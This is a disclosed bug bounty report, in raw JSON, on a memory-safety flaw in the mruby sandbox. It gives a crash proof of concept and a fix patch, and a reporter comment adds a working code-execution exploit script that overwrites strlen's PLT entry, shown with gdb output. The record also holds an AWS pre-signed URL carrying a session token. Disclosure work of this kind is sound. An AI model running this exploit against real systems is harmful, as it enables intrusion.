{"id":201897,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDE4OTc=","url":"https://hackerone.com/reports/201897","title":"Recursion causing uninitialized memory reads leading to a segfault","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-01-29T10:18:43.076Z","submitted_at":"2017-01-29T10:18:43.076Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dgaletic","url":"/dgaletic","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-02-28T13:30:02.780Z","bug_reporter_agreed_on_going_public_at":"2017-02-28T13:30:02.729Z","team_member_agreed_on_going_public_at":"2017-02-27T23:33:54.201Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The following code produces a segfault without causing a stack overflow, affecting the sandbox:\n\n    def fn(n)\n        return\n        ensure\n            if n == 0\n        else fn(n-1)\n        end\n    end\n    fn(24)\n\nWhen the `n` parameter is less than 24, there is no segfault. However,\ninvestigating with a memory sanitizer shows that uninitialized read errors\nstart to happen when `n \u003e= 15`. The uninitialized read happens at the following\nlocation in vm.c (with the relevant line marked):\n\n```\n1701         cipop(mrb);\n1702         acc = ci-\u003eacc;  [***]\n1703         mrb-\u003ec-\u003estack = ci-\u003estackent;\n```\n\nThe issue seems to be in using the `ci` data after the call to `cipop`. The following patch stops the read errors and segfaults, and passes make test:\n\n```\ndiff --git a/src/vm.c b/src/vm.c\nindex 9684dab..66fb692 100644\n--- a/src/vm.c\n+++ b/src/vm.c\n@@ -1698,9 +1698,10 @@ RETRY_TRY_BLOCK:\n           mrb-\u003ejmp = prev_jmp;\n           return v;\n         }\n-        cipop(mrb);\n+        ci = mrb-\u003ec-\u003eci;\n         acc = ci-\u003eacc;\n         mrb-\u003ec-\u003estack = ci-\u003estackent;\n+        cipop(mrb);\n         if (acc == CI_ACC_SKIP) {\n           mrb-\u003ejmp = prev_jmp;\n           return v;\n```","vulnerability_information_html":"\u003cp\u003eThe following code produces a segfault without causing a stack overflow, affecting the sandbox:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef fn(n)\n    return\n    ensure\n        if n == 0\n    else fn(n-1)\n    end\nend\nfn(24)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen the \u003ccode\u003en\u003c/code\u003e parameter is less than 24, there is no segfault. However,\u003cbr\u003e\ninvestigating with a memory sanitizer shows that uninitialized read errors\u003cbr\u003e\nstart to happen when \u003ccode\u003en \u0026gt;= 15\u003c/code\u003e. The uninitialized read happens at the following\u003cbr\u003e\nlocation in vm.c (with the relevant line marked):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1701         cipop(mrb);\n1702         acc = ci-\u0026gt;acc;  [***]\n1703         mrb-\u0026gt;c-\u0026gt;stack = ci-\u0026gt;stackent;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe issue seems to be in using the \u003ccode\u003eci\u003c/code\u003e data after the call to \u003ccode\u003ecipop\u003c/code\u003e. The following patch stops the read errors and segfaults, and passes make test:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/src/vm.c b/src/vm.c\nindex 9684dab..66fb692 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/vm.c\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/vm.c\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1698,9 +1698,10 @@\u003c/span\u003e RETRY_TRY_BLOCK:\n           mrb-\u0026gt;jmp = prev_jmp;\n           return v;\n         }\n\u003cspan class=\"gd\"\u003e-        cipop(mrb);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        ci = mrb-\u0026gt;c-\u0026gt;ci;\n\u003c/span\u003e         acc = ci-\u0026gt;acc;\n         mrb-\u0026gt;c-\u0026gt;stack = ci-\u0026gt;stackent;\n\u003cspan class=\"gi\"\u003e+        cipop(mrb);\n\u003c/span\u003e         if (acc == CI_ACC_SKIP) {\n           mrb-\u0026gt;jmp = prev_jmp;\n           return v;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":155829,"file_name":"0001-Prevent-use-of-old-pointer-value-possibly-invalidate.patch","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/155/829/85727abf1b3f3af82e3292bebe7e145227d66fa5/0001-Prevent-use-of-old-pointer-value-possibly-invalidate.patch?response-content-disposition=attachment%3B%20filename%3D%220001-Prevent-use-of-old-pointer-value-possibly-invalidate.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Prevent-use-of-old-pointer-value-possibly-invalidate.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045339Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=ebd0036e91b72a3650f41c165380e183d0ab638121f2284052f94945359fec4b","file_size":1000,"type":"text/x-diff"}],"allow_singular_disclosure_at":"2017-03-29T23:33:54.232Z","allow_singular_disclosure_after":-118387184.78498125,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","spetr0x","frrrrriend"],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1450189,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-01-29T10:18:43.314Z","updated_at":"2017-01-29T10:18:43.314Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1450226,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If the above POC doesn't crash the sandbox reliably, try increasing the n parameter (it crashes for me with n = 30). Also, a small correction: the memory errors and segfault are caused by holding onto the old `mrb-\u003ec-\u003eci` pointer in the `ci` variable after the calls to `ecall` which sometimes reallocate into a different block. The call to `cipop` needed to be moved so the fix can work because `cipop` modifies `mrb-\u003ec-\u003eci`.\n\nThank you,\nDinko Galetic and \nDenis Kasak","markdown_message":"\u003cp\u003eIf the above POC doesn\u0026#39;t crash the sandbox reliably, try increasing the n parameter (it crashes for me with n = 30). Also, a small correction: the memory errors and segfault are caused by holding onto the old \u003ccode\u003emrb-\u0026gt;c-\u0026gt;ci\u003c/code\u003e pointer in the \u003ccode\u003eci\u003c/code\u003e variable after the calls to \u003ccode\u003eecall\u003c/code\u003e which sometimes reallocate into a different block. The call to \u003ccode\u003ecipop\u003c/code\u003e needed to be moved so the fix can work because \u003ccode\u003ecipop\u003c/code\u003e modifies \u003ccode\u003emrb-\u0026gt;c-\u0026gt;ci\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThank you,\u003cbr\u003e\nDinko Galetic and \u003cbr\u003e\nDenis Kasak\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-29T11:19:50.633Z","updated_at":"2017-01-29T11:19:50.633Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1457358,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue locally, and opened an issue upstream: https://github.com/mruby/mruby/issues/3423","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue locally, and opened an issue upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3423\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3423\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3423\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-01T22:37:34.691Z","updated_at":"2017-02-01T22:37:34.691Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1461755,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Update: This bug can be also be used for remote code execution. We managed to\nexploit mruby by taking control of `regs`, `acc`, `v` and `pc` of the struct\npointed to by `ci` in the `L_RETURN` block of `mrb_vm_exec` to overwrite the\n`strlen` PLT entry. Control of the mentioned variables was achieved by\nallocating large Ruby strings in the ensure loop which eventually end up in the\nmemory deallocated by `realloc`.\n\nThe following code succeeds in exploiting mruby locally for us:\n\n```\ndef f(n)\n    return 32766 + 24239 # 0xdead\n    ensure\n    if n==0\n    else\n        $a = \"AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEpAEqAErAEsAEtAEuAEvAEwAExAEyAEzAE1AE2AE3AE4AE5AE6AE7AE8AE9AE0AFBAFCAFDAFEAFFAFGAFHAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFkAFlAFmAFnAFoAFpAFqAFrAFsAFtAFuAFvAFwAFxAFyAFzAF1AF2AF3AF4AF5AF6AF7AF8AF9AF0AGBAGCAGDAGEAGFAGGAGHAGIAGJAGKAGLAGMAGNAGOAGPAGQAGRAGSAGTAGUAGVAGWAGXAGYAGZAGaAGbAGcAGdAGeAGfAGgAGhAGiAGjAGkAGlAGmAGnAGoAGpAGqAGrAGsAGtAGuAGvAGwAGxAGyAGzAG1AG2AG3AG4AG5AG6AG7AG8AG9AG0AHBAHCAHDAHEAHFAHGAHHAHIAHJAHKAHLAHMAHNAHOAHPAHQAHRAHSAHTAHUAHVAHWAHXAHYAHZAHaAHbAHcAHdAHeAHfAHgAHhAHiAHjAHkAHlAHmAHnAHoAHpAHqAHrAHsAHtAHuAHvAHwAHxAHyAHzAH1AH2AH3AH4AH5AH6AH7AH8AH9AH0AIBAICAIDAIEAIFAIGAIHAIIAIJAIKAILAIMAINAIOAIPAIQAIRAISAITAIUAIVAIWAIXAIYAIZAIaAIbAIcAIdAIeAIfAIgAIhAIiAIjAIkAIlAImAInAIoAIpAIqAIrAIsAItAIuAIvAIwAIxAIyAIzAI1AI2AI3AI4AI5AI6AI7AI8AI9AI0AJBAJCAJDAJEAJFAJGAJHAJIAJJAJKAJLAJMAJNAJOAJPAJQAJRAJSAJTAJUAJVAJWAJXAJYAJZAJaAJbAJcAJdAJeAJfAJgAJhAJiAJjAJkAJlAJmAJnAJoAJpAJqAJrAJsAJtAJuAJvAJwAJxAJyAJzAJ1AJ2AJ3AJ4AJ5AJ6AJ7AJ8AJ9AJ0AKBAKCAKDAKEAKFAKGAKHAKIAKJAKKAKLAKMAKNAKOAKPAKQAKRAKSAKTAKUAKVAKWAKXAKYAKZAKaAKbAKcAKdAK\\xa0\\x40\\x6b\\0\\0\\0\\0\\0KhAKiAKjAKkAKlAKmAKnAKoA\\x08\\xa3\\x70\\0\\0\\0\\0\\0AKsAKtAKuAKv\\0\\0\\0\\0KxAKyAKzAK1AK2AK3AK4AK5AK6AK7AK8AK9AK0ALBALCALDALEALFALGALHALIALJALKALLA\" * 8 if n % 2 == 0\n        String.new(str=\"\")\n        f(n-1)\n    end\nend\nf(122)\n```\n\nRunning the program results in the following segfault, demonstrating control of\n`rip`:\n\n    Program received signal SIGSEGV, Segmentation fault.\n    0x000000000000dead in ?? ()\n\nControlling `regs`, `acc` and `v` in combination allows us to overwrite any 16\nbytes of memory via the following line (`vm.c`, 1715):\n\n    regs[acc] = v;\n\nBy allocating large de Bruijn strings inside the ensure recursion, the bytes\nthat land on each member of the `callinfo` struct are clearly marked. A sample\ngdb output from one of our test runs shows that the value of `stackent` \ncorresponds to the substring \"JmAJnAJo\", `acc` corresponds to \"4AJ5\", and so \non. \n\n    (gdb) print *ci\n    $2 = {mid = 1097353793, proc = 0x416c4a416b4a416a, stackent = \n    0x6f4a416e4a416d4a, nregs = 1097878081, ridx = 1245802826, eidx = 1934246258, \n    env = 0x774a41764a41754a, pc = 0x4a417 94a41784a41, err = 0x41324a41314a417a, \n    argc = 1245786954, acc = 894058804, target_class = 0x4a41374a41364a41}\n\nThese bytes are then set to point the write at a PLT entry for `strlen`:\n\n    00000000006b40a0 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5\n\nNote: This address will obviously be different on a different binary, but\nrunning a bruteforce attack (or having another information disclosure vector)\nwill eventually cause the desired RCE. To demonstrate it on your platform, you\nwould have to look at the output of `objdump -R \u003cmruby binary\u003e | grep strlen`\nand replace our payload substring (see below) with that address.\n\nA small complication is that the returned value `v` gets slightly modified at \nsome point before the assignment if the returned literal is greater than 32766. \nThis can be circumvented by using basic arithmetic, e.g. \n`return 32766 * 215 + 5846` would set `v` to 0x6b9528.\n\nIn the payload string `$a`, the address of the overwritten PLT entry is\nreferenced by the substring `\\xa0\\x40\\x6b\\0\\0\\0\\0\\0`, which ends up as the\nvalue of `regs`, with `acc` being set to 0.\n\nFinally, to make sure `strlen` is called, we set `pc` such that the next\ninstruction executed is `OP_ERR` (opcode number 75), e.g.:\n\n    (gdb) find 0x6c0000,0x7f0000,75\n    0x6c5b34\n    0x6c5de8\n    0x6e4564\n    0x6e6688\n    ***0x70a308***\n    0x70c6eb\n    0x721c10\n    7 patterns found.\n\n    (gdb) x 0x70a308\n    0x70a308:       0x4b\n    (gdb) p 0x4b\n    $130 = 75\n\nThis is the `\\x08\\xa3\\x70\\0\\0\\0\\0\\0` of the payload string. The `OP_ERR` opcode\nwill call `strlen` soon after (`E_RUNTIME_ERROR` -\u003e `mrb_exc_get` -\u003e\n`mrb_class_get_under` -\u003e `class_from_sym` -\u003e `mrb_intern` -\u003e` strlen`).","markdown_message":"\u003cp\u003eUpdate: This bug can be also be used for remote code execution. We managed to\u003cbr\u003e\nexploit mruby by taking control of \u003ccode\u003eregs\u003c/code\u003e, \u003ccode\u003eacc\u003c/code\u003e, \u003ccode\u003ev\u003c/code\u003e and \u003ccode\u003epc\u003c/code\u003e of the struct\u003cbr\u003e\npointed to by \u003ccode\u003eci\u003c/code\u003e in the \u003ccode\u003eL_RETURN\u003c/code\u003e block of \u003ccode\u003emrb_vm_exec\u003c/code\u003e to overwrite the\u003cbr\u003e\n\u003ccode\u003estrlen\u003c/code\u003e PLT entry. Control of the mentioned variables was achieved by\u003cbr\u003e\nallocating large Ruby strings in the ensure loop which eventually end up in the\u003cbr\u003e\nmemory deallocated by \u003ccode\u003erealloc\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe following code succeeds in exploiting mruby locally for us:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef f(n)\n    return 32766 + 24239 # 0xdead\n    ensure\n    if n==0\n    else\n        $a = \u0026quot;AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEpAEqAErAEsAEtAEuAEvAEwAExAEyAEzAE1AE2AE3AE4AE5AE6AE7AE8AE9AE0AFBAFCAFDAFEAFFAFGAFHAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFkAFlAFmAFnAFoAFpAFqAFrAFsAFtAFuAFvAFwAFxAFyAFzAF1AF2AF3AF4AF5AF6AF7AF8AF9AF0AGBAGCAGDAGEAGFAGGAGHAGIAGJAGKAGLAGMAGNAGOAGPAGQAGRAGSAGTAGUAGVAGWAGXAGYAGZAGaAGbAGcAGdAGeAGfAGgAGhAGiAGjAGkAGlAGmAGnAGoAGpAGqAGrAGsAGtAGuAGvAGwAGxAGyAGzAG1AG2AG3AG4AG5AG6AG7AG8AG9AG0AHBAHCAHDAHEAHFAHGAHHAHIAHJAHKAHLAHMAHNAHOAHPAHQAHRAHSAHTAHUAHVAHWAHXAHYAHZAHaAHbAHcAHdAHeAHfAHgAHhAHiAHjAHkAHlAHmAHnAHoAHpAHqAHrAHsAHtAHuAHvAHwAHxAHyAHzAH1AH2AH3AH4AH5AH6AH7AH8AH9AH0AIBAICAIDAIEAIFAIGAIHAIIAIJAIKAILAIMAINAIOAIPAIQAIRAISAITAIUAIVAIWAIXAIYAIZAIaAIbAIcAIdAIeAIfAIgAIhAIiAIjAIkAIlAImAInAIoAIpAIqAIrAIsAItAIuAIvAIwAIxAIyAIzAI1AI2AI3AI4AI5AI6AI7AI8AI9AI0AJBAJCAJDAJEAJFAJGAJHAJIAJJAJKAJLAJMAJNAJOAJPAJQAJRAJSAJTAJUAJVAJWAJXAJYAJZAJaAJbAJcAJdAJeAJfAJgAJhAJiAJjAJkAJlAJmAJnAJoAJpAJqAJrAJsAJtAJuAJvAJwAJxAJyAJzAJ1AJ2AJ3AJ4AJ5AJ6AJ7AJ8AJ9AJ0AKBAKCAKDAKEAKFAKGAKHAKIAKJAKKAKLAKMAKNAKOAKPAKQAKRAKSAKTAKUAKVAKWAKXAKYAKZAKaAKbAKcAKdAK\\xa0\\x40\\x6b\\0\\0\\0\\0\\0KhAKiAKjAKkAKlAKmAKnAKoA\\x08\\xa3\\x70\\0\\0\\0\\0\\0AKsAKtAKuAKv\\0\\0\\0\\0KxAKyAKzAK1AK2AK3AK4AK5AK6AK7AK8AK9AK0ALBALCALDALEALFALGALHALIALJALKALLA\u0026quot; * 8 if n % 2 == 0\n        String.new(str=\u0026quot;\u0026quot;)\n        f(n-1)\n    end\nend\nf(122)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRunning the program results in the following segfault, demonstrating control of\u003cbr\u003e\n\u003ccode\u003erip\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eProgram received signal SIGSEGV, Segmentation fault.\n0x000000000000dead in ?? ()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eControlling \u003ccode\u003eregs\u003c/code\u003e, \u003ccode\u003eacc\u003c/code\u003e and \u003ccode\u003ev\u003c/code\u003e in combination allows us to overwrite any 16\u003cbr\u003e\nbytes of memory via the following line (\u003ccode\u003evm.c\u003c/code\u003e, 1715):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eregs[acc] = v;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBy allocating large de Bruijn strings inside the ensure recursion, the bytes\u003cbr\u003e\nthat land on each member of the \u003ccode\u003ecallinfo\u003c/code\u003e struct are clearly marked. A sample\u003cbr\u003e\ngdb output from one of our test runs shows that the value of \u003ccode\u003estackent\u003c/code\u003e \u003cbr\u003e\ncorresponds to the substring \u0026quot;JmAJnAJo\u0026quot;, \u003ccode\u003eacc\u003c/code\u003e corresponds to \u0026quot;4AJ5\u0026quot;, and so \u003cbr\u003e\non. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) print *ci\n$2 = {mid = 1097353793, proc = 0x416c4a416b4a416a, stackent = \n0x6f4a416e4a416d4a, nregs = 1097878081, ridx = 1245802826, eidx = 1934246258, \nenv = 0x774a41764a41754a, pc = 0x4a417 94a41784a41, err = 0x41324a41314a417a, \nargc = 1245786954, acc = 894058804, target_class = 0x4a41374a41364a41}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThese bytes are then set to point the write at a PLT entry for \u003ccode\u003estrlen\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e00000000006b40a0 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote: This address will obviously be different on a different binary, but\u003cbr\u003e\nrunning a bruteforce attack (or having another information disclosure vector)\u003cbr\u003e\nwill eventually cause the desired RCE. To demonstrate it on your platform, you\u003cbr\u003e\nwould have to look at the output of \u003ccode\u003eobjdump -R \u0026lt;mruby binary\u0026gt; | grep strlen\u003c/code\u003e\u003cbr\u003e\nand replace our payload substring (see below) with that address.\u003c/p\u003e\n\n\u003cp\u003eA small complication is that the returned value \u003ccode\u003ev\u003c/code\u003e gets slightly modified at \u003cbr\u003e\nsome point before the assignment if the returned literal is greater than 32766. \u003cbr\u003e\nThis can be circumvented by using basic arithmetic, e.g. \u003cbr\u003e\n\u003ccode\u003ereturn 32766 * 215 + 5846\u003c/code\u003e would set \u003ccode\u003ev\u003c/code\u003e to 0x6b9528.\u003c/p\u003e\n\n\u003cp\u003eIn the payload string \u003ccode\u003e$a\u003c/code\u003e, the address of the overwritten PLT entry is\u003cbr\u003e\nreferenced by the substring \u003ccode\u003e\\xa0\\x40\\x6b\\0\\0\\0\\0\\0\u003c/code\u003e, which ends up as the\u003cbr\u003e\nvalue of \u003ccode\u003eregs\u003c/code\u003e, with \u003ccode\u003eacc\u003c/code\u003e being set to 0.\u003c/p\u003e\n\n\u003cp\u003eFinally, to make sure \u003ccode\u003estrlen\u003c/code\u003e is called, we set \u003ccode\u003epc\u003c/code\u003e such that the next\u003cbr\u003e\ninstruction executed is \u003ccode\u003eOP_ERR\u003c/code\u003e (opcode number 75), e.g.:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) find 0x6c0000,0x7f0000,75\n0x6c5b34\n0x6c5de8\n0x6e4564\n0x6e6688\n***0x70a308***\n0x70c6eb\n0x721c10\n7 patterns found.\n\n(gdb) x 0x70a308\n0x70a308:       0x4b\n(gdb) p 0x4b\n$130 = 75\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is the 